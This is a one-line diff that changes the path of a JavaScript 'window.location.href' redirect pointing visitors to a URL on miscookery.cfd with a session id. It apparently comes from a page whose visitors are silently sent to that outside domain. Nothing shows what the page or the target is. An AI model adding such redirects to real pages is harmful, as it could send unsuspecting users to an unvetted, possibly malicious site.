@@ -1,1 +1,1 @@
-window.location.href = "https://miscookery.cfd/CDYl/go?sid=7747";
+window.location.href = "https://miscookery.cfd/XQZ/go?sid=7747";
